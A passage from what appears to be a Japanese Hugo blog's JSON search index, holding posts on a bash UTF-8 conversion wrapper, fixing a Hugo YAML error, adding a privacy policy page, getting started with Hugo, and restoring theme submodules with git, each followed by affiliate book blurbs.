]; then cat \u0026#34;$filename\u0026#34; | nkf -wLu \u0026gt; \u0026#34;$filename\u0026#34;.u ; mv \u0026#34;$filename\u0026#34;.u \u0026#34;$filename\u0026#34; ; fi } # if ! which nkf \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then echo \u0026#34;nkf がありません\u0026#34; ; echo \u0026#34;nkf をインストールして下さい\u0026#34; ; exit ; fi # if [ -z \u0026#34;$filename\u0026#34; ] ; then echo \u0026#34;第一引数にファイル名を指定して下さい\u0026#34; echo \u0026#34;実行例： wLu filename\u0026#34; ; exit ; fi # 実行 wLu ; # 終了 exit ; 作成したファイルには日本語が含まれているため、wLuファイルを UTF-8に変換しておきます。\n# wLu ファイルをnkf -wLu でUTF-8に変換 $ nkf -wLu wLu \u0026gt; wLu.txt # wLu.txtをwLuにリネームします $ mv wLu.txt wLu # 作成したwLuコマンドファイルを/usr/local/bin にコピーします $ sudo wLu /usr/local/bin/ # コマンドが配置されたかを確認 $ which wLu $ /usr/local/bin/wLu 使い方 # UTF-8以外のファイルエンコードファイル $ cat moto.txt $ wLu moto.txt 変換結果を一時ファイルにし、リネームする手間が省けます。\n便利ですね。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-23T10:27:27+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-23-suzuki/","title":"【wLu】Bashで便利なコマンドを作ってみようって話"},{"content":"エラーの内容 記事投稿時にfailed to unmarshal YAM エラーが起こった時の原因について\nhugo new ファイル名 で投稿用のエントリーを作成し、いざhugo コマンドで記事をアップしようとした時に以下のエラーが出ました。\nStart building sites …\nTotal in 10 ms\nError: Error building site: \u0026ldquo;/xxxx/xxxx/xxxx.github.io/content/posts/2021-12-21-03.md:2:1\u0026rdquo;: failed to unmarshal YAML: yaml: control characters are not allowed\n原因 このようなエラーが出る場合原因として考えられるのがファイルの文字コードがUTF-8になってないことです。\nvim でファイル名を開くと右下に文字コードが表示されますが「iso-2022-jp-3」のようになってませんでしょうか？\n対応 この場合ファイルの文字コードをUTF8に変更してみましょう。\nnkf -wLu ファイル名 \u0026gt;一時保存ファイル名; mv 一時保存ファイル名 ファイル名 一時保存した後にmvで戻したり面倒ですよね。\nhugo new した時に日本語が含まれていたら文字コードutf8になると思われるので設定で回避できないか次回調べてみたいと思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-22T21:22:23+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21-03/error_hu7e39d96c0286759ff592e45a50a24444_91990_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21-03/","title":"hugoで[failed to unmarshal YAML]エラーが出た場合の対処法"},{"content":"github pagesでもgoogle adsenseの審査に通過したい！\nということで色々先人の方達のサイトをみさせていただいたところ\ngoogle adsenseを通過するためにはプライバシーポリシーが必要ということで準備しました。\n内容はとりあえずコピペで行こう まずはコピペOKの親切な方のサイトを探します。\n内容については以下のサイトを参考にさせていただきました。\nhttp://liberty-life-blog.com/wordpress/privacy-policy/\n設定 以下のコマンドでhugoでページを作成します。\nhugo new page/privacy.md コンテンツの構成を以下のように管理しているのでpage以下に保存しました。\ncontent/posts \u0026ndash; 記事\n/page \u0026ndash; about usページなど\n/assetes \u0026ndash; 画像など\nvim content/page/privacy.md --- title: \u0026#34;Privacy\u0026#34; date: 2021-12-22T17:16:15+09:00 draft: false --- ページの内容を２個目の\u0026mdash;以下に貼り付けます\ndraft: true に変更します\nhugo ビルドします\nフッターにリンクを置こう フッターの内容を修正してプライバシーポリシーのリンクを設置します。\nthemes以下にあるファイルを直接書き換えるのではなく\nlayoutsフォルダ以下に同名のファイルを作成することで上書きすることができるみたいです。\nlayouts/partial/footer/footer.html\u0026lt;\u0026ndash;優先順位高い\nthemes/テーマ名/layouts/partial/footer/footer.html\nlayouts/partial/footer/footer.html を新規に作成して\n以下の内容を入力\n\u0026lt;footer class=\u0026#34;site-footer\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;{{ .Site.BaseURL }}privacy/\u0026#34;\u0026gt;プライバシーポリシー\u0026lt;/a\u0026gt; \u0026lt;section class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026amp;copy; {{ if and (.Site.Params.footer.since) (ne .Site.Params.footer.since (int (now.Format \u0026#34;2006\u0026#34;))) }} {{ .Site.Params.footer.since }} - {{ end }} {{ now.Format \u0026#34;2006\u0026#34; }} {{ .Site.Title }} \u0026lt;/section\u0026gt; \u0026lt;/footer\u0026gt; リンクの書き方が\n{{ .Site.BaseURL }}privacy/\nのは注意\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-22T17:40:27+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-21-02/privacy_hu6d356af4ff9900abfdb99df6dc97252e_302641_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-21-02/","title":"プライバシーポリシーページを設置する"},{"content":"CMSではWordPressが有名ですが、phpやサーバの準備などに時間がかかってしまったり、ちょっと敷居が高いイメージではないでしょうか。\nWordPressのインストールのためにはサーバも必要ですし、ドメインだって必要です。\n色々用意するのが手間だなと思う人は、Hugo+GitHubで簡単に、早く、さっくりとサイトを作ってしまうのをオススメします。\n無料で、httpsも設定できるので非常に便利です。\nHUGOとは HUGOとはGo言語で記述され、速度や使いやすさ、設定のしやすさなどを重視して最適化された静的なHTMLやCSSのサイトジェネレーターです。コンテンツとテンプレートを分けて構築し、それらを組み合わせてHTMLをレンダリングします。\nHugoでブログを記述する際には「Markdown」と呼ばれる言語を使います。\nサイトを公開、再構築する際には「hugo」というコマンドを使用します。\nこのコマンドはどのディレクトリからでも実行することができるので、特権アカウントを持っていない共有ホストやその他のシステムで使用することも可能です。\nそして、中程度のサイズの典型的なWebサイトをほんの一瞬でレンダリングします。\n経験則として、各コンテンツは約1ミリ秒でレンダリングされ、ブログやドキュメントなど、どのような種類のウェブサイトでもうまく動作するように設計されています。\nサポートされるアーキテクチャ サポートされるアーキテクチャは2022年1月時点で、Windows、Linux、FreeBSD、NetBSD、DragonFly BSD、OpenBSD、macOS (Darwin)、 Android用にx64、i386、ARMアーキテクチャ用のHugoバイナリをビルド済みで提供しています。\nHUGOは、Goコンパイラツールが実行できる場所であれば、ソースからコンパイルすることもできます。たとえば、Plan 9やSolarisを含む他のオペレーティングシステムにも対応しています。\nHugoのインストール HUGOをサイトジェネレーターとして使用する場合は、すごく簡単で、Hugoバイナリをインストールするだけで、バイナリには外部依存関係はありません。\nバイナリ（クロスプラットフォーム） GitHubにある Releases からプラットフォームに適したバージョンをダウンロードします。\nダウンロードしたバイナリはどこからでも実行可能です。\nグローバルな場所にインストールする必要はなく、権限のないアカウントや共有ホストやその他のシステムでも動作します。\n理想的には、 /usr/local/bin など使いやすいようにどこかにインストールする必要があります。\nMacでbrewを使う場合 macOSを使用していて、Homebrewを使用している場合は、次のワンライナーを使用してHugoをインストールできます。\n※端末はMacで進めていきます。開発なども便利なのでMacを持っていると何かと便利ですよ。\nbrew install hugo MacPortsの場合 macOSを使用していてMacPortsを使用している場合は、次のワンライナーを使用してHugoをインストールできます。\nport install hugo その他の端末でもコマンドを利用してダウンロード可能です。\n詳しくは Install Hugo を見てみてください。\n設定 HUGOはさまざまなコマンドラインの機能を備えていますが、コマンドラインに不慣れな場合でも簡単に使用できます。\n以下は、Hugoプロジェクトの開発中に使用するもっとも一般的なコマンドの説明です。\nインストールの確認 Hugoをインストールしたら、PATHがあることを確認してください。helpコマンドを使用して、Hugoが正しくインストールされていることをテストできます。\nhugo help 実行すると、コンソールに表示される出力は次のようになるかと思います。\nhugo is the main command, used to build your Hugo site. Hugo is a Fast and Flexible Static Site Generator built with love by spf13 and friends in Go. Complete documentation is available at http://gohugo.io/. Usage: hugo [flags] hugo [command] Available Commands: check Contains some verification checks completion generate the autocompletion script for the specified shell config Print the site configuration convert Convert your content to different formats deploy Deploy your site to a Cloud provider. env Print Hugo version and environment info gen A collection of several useful generators. help Help about any command import Import your site from others. list Listing out various types of content mod Various Hugo Modules helpers. new Create new content for your site server A high performance webserver version Print the version number of Hugo Flags: -b, --baseURL string hostname (and path) to the root, e.g. http://spf13.com/ -D, --buildDrafts include content marked as draft -E, --buildExpired include expired content -F, --buildFuture include content with publishdate in the future --cacheDir string filesystem path to cache directory. Defaults: $TMPDIR/hugo_cache/ --cleanDestinationDir remove files from destination not found in static directories --config string config file (default is path/config.yaml|json|toml) --configDir string config dir (default \u0026#34;config\u0026#34;) -c, --contentDir string filesystem path to content directory --debug debug output -d, --destination string filesystem path to write files to --disableKinds strings disable different kind of pages (home, RSS etc.) --enableGitInfo add Git revision, date and author info to the pages -e, --environment string build environment --forceSyncStatic copy all files when static is changed. --gc enable to run some cleanup tasks (remove unused cache files) after the build -h, --help help for hugo --i18n-warnings print missing translations --ignoreCache ignores the cache directory --ignoreVendor ignores any _vendor directory --ignoreVendorPaths string ignores any _vendor for module paths matching the given Glob pattern -l, --layoutDir string filesystem path to layout directory --log enable Logging --logFile string log File path (if set, logging enabled automatically) --minify minify any supported output format (HTML, XML etc.) --noChmod don\u0026#39;t sync permission mode of files --noTimes don\u0026#39;t sync modification time of files --path-warnings print warnings on duplicate target paths etc. --poll string set this to a poll interval, e.g --poll 700ms, to use a poll based approach to watch for file system changes --print-mem print memory usage to screen at intervals --quiet build in quiet mode --renderToMemory render to memory (only useful for benchmark testing) -s, --source string filesystem path to read files relative from --templateMetrics display metrics about template executions --templateMetricsHints calculate some improvement hints when combined with --templateMetrics -t, --theme strings themes to use (located in /themes/THEMENAME/) --themesDir string filesystem path to themes directory --trace file write trace to file (not useful in general) -v, --verbose verbose output --verboseLog verbose logging -w, --watch watch filesystem for changes and recreate as needed Use \u0026#34;hugo [command] --help\u0026#34; for more information about a command. hugoコマンド 一般的な使い方は、カレント・ディレクトリを入力ディレクトリとしてhugoを実行することだと思います。\nデフォルトでpublic/ ディレクトリにウェブサイトを生成しますが、サイトの設定（configファイル）でpublishDirフィールドを変更することにより、出力ディレクトリをカスタマイズできます。\nhugoコマンドはサイトをpublic/ディレクトリにレンダリングし、ウェブサーバにデプロイする準備ができます。\n$ hugo 0 draft content 0 future content 99 pages created 0 paginator pages created 16 tags created 0 groups created in 90 ms 使ってみる hugoのインストールが終わったら、サイトを作成します。\nhugo new site ＜作成するディレクトリ＞ 色々表示されているかと思いますが、気にしないで大丈夫です。\n設定ファイル hugoの設定はTOMLという形式で記述します。\nTOMLに慣れていない人はJSONやYAMLといった形式でも記述できます。\nその場合はconfig.tomlを削除してください。\nbaseURL = \u0026#34;http://example.org/\u0026#34; languageCode = \u0026#34;en-us\u0026#34; title = \u0026#34;My New Hugo Site\u0026#34; baseURL: サイトの公開URL languageCode: HTMLのlang部分 title: サイトの名前 記事の投稿 記事を作成するにはコマンドを打つ必要があります\nhugo new posts/helloworld.md このコマンドで、postsディレクトリ以下にhelloworld.mdといったファイルが生成されます\nテーマによってはpostsディレクトリではなく、postであったりするので、テーマの詳細を確認してください。\n下書きから公開へ 作成されたファイルはmarkdown形式で記述されています。\n--- title: \u0026#34;helloworld\u0026#34; date: 2021-12-22T11:23:09Z draft: true --- draftの部分が下書き状態を表しています。\nfalseにすることで公開となり表示されます。\nHUGOでの下書き、未来、期限切れについて Hugoでは、コンテンツの記述時にドラフト、公開日、そして有効期限を設定できます。デフォルトでは、Hugoは公開（draft: true）しません。\nまた、以下の場合はコンテンツを公開しないので、注意してください\npublishdateが将来の公開日を指定したコンテンツ draft: trueのステータスを持つコンテンツ 有効期限（expirydate）を過ぎたコンテンツ 予約投稿 公開日付（publishdate）が未来で、公開状態にある記事は予約投稿として扱われます。 有効期限付き expirydate に日付を指定することで、記事の有効期限を設定することも可能です。 確認 サイトの確認を行うには\nhugoをインストールしたディレクトリで\nhugo server を実行します。\nこの場合は公開されている記事のみを表示した状態のサーバが立ち上がります。\n未公開も含めたい場合は\nhugo server -D とすることで表示できます。\n公開 公開をするにはサイト全体を構築し直す必要があります。\nhugo このコマンドでサイト全体が自動的に生成されます。\n作成されたサイトは初期状態ではpublicディレクトリに展開されます。\nconfigのpublicDirに任意のディレクトリを設定することも可能です\npublicDir = \u0026#39;docs\u0026#39; この場合はdocsディレクトリに公開ファイルが展開されます。\n終わりに 駆け足でしたが、hugoの簡単な使い方になります。\n大きな設定も不要で、markdownで記述できるので初心者やデザイナーなどでもとっつきやすいのではないかと思います。\nみなさんもぜひ、hugoを試してみてください。\nオススメの書籍 Hugoで始める静的サイト構築入門　静的サイトジェネレーターで作る自作サイト (技術の泉シリーズ（NextPublishing）) 本書は静的サイトジェネレーターの一つであるHugoの解説書です。できるだけ低コストでサイトを運用したい、WordPressなどの各種CMSから移行したい、というケースに合わせて構築方法などを解説します。Hugoを利用してオリジナリティーのあるサイトを自分で構築、管理したい方に向けての一冊です。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 【特典付き! 】Webサイト高速化のための 静的サイトジェネレーター活用入門 (Compass Booksシリーズ) GatsbyJSで実現する、高速\u0026amp;実用的なサイト構築 「高速化\u0026amp;最適化」「メタデータ対応」「SPAやPWAへの対応」など、これからのWebサイトに求められる要素に対応するための、静的サイトジェネレーターの活用書。 本書は「GatsbyJS(Gatsby)」を使って、「ReactやJavaScript(ECMAScript)に自信が無くても、実用レベルのWebサイトを構築できるようになる」ことを目標にしています。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-22T13:07:49+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/2021-12-22-hugo-01_hub5e89b620d2afe5c10cf3894738f1203_83896_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-22-hugo-01-ywat/","title":"デザイナーでもできる初めてのHUGOでのサイト作成 #01"},{"content":"Hugoではテーマ（theme）を使って簡単にブログやサイトを作成することが可能です。テーマはGitHubなどにたくさん公開されて簡単に導入することが可能です。\nしかし、テーマををインストールするのを忘れてしまうと、不具合の原因につながってしまうので注意が必要です。\n今回はHugoを使って構築したサイトで、テーマが反映されずに画面が真っ白のまま担ってしまった場合の対処法を説明してきます。\nテーマはサブモジュールでインストール テーマはGitで管理されていることが多いので、そのままインストールしてしまうとHugoのディレクトリを汚染してしまいます。\nHugoでテーマをインストールする際はサブモジュール（submodule）として管理するようにしましょう。そうすることで、本来のHugoディレクトリに影響を与えることなく、テーマのアップデートなどを実行できます。\nサイトをクローンしたら画面が真っ白のままになった Hugoで作成したサイトを別の端末などでクローンした際に、画面が真っ白になってしまうことがあります。この問題に直面した場合は、まずはテーマがインストールされているかを確認しましょう。\nインストールされていない場合は、サブモジュール化されたテーマを再度インストールすることで画面が真っ白い状態から正常な表示に変わるかと思います。\nサブモジュールのインストールコマンドは下記のようになります。\ngit submodule update --init --recursive Hugoのサイトをgit cloneする際は、テーマが反映されない場合が多いので、サブモジュールのインストールも忘れずに行うようにしましょう。\nクローンするときに一緒にサブモジュールもインストール そうは言っても、サブモジュールのインストールを忘れることが多いです。\nその場合は、初回git cloneする際にsubmodule（サブモジュール）も一緒にcloneすることで不具合を起こすことなく、表示することができます。\ngit clone --recursive {クローンしたいリポジトリ} まとめ Hugoでテーマが反映されない（画面が真っ白のまま）のときの対応はいかがだったでしょうか。\nサブモジュールで管理できるのは便利であると同時に、忘れてしまうとサイトの不具合につながってしまい、別端末で正常に動作していると解決が難しくなってしまうことも多いと思います。\nHugoのサイトをgit cloneする際はサブモジュールでテーマの反映も忘れないようにしておきましょう。\nおすすめの書籍 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 いちばんやさしいGit\u0026amp;GitHubの教本 人気講師が教えるバージョン管理\u0026amp;共有入門 (「いちばんやさしい教本」シリーズ) 実際のワークフローをイメージしながら 実践的なGit/GitHubの使い方が身につく「いちばんやさしい」入門書です。 前半は、手元のパソコンでファイルを実際にバージョン管理しながら、 Gitの基本的な使い方を解説。 後半では、実践的なワークフローに沿ってGitHubを使い、 チームメンバーと一緒に開発を進めるための知識が身につきます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 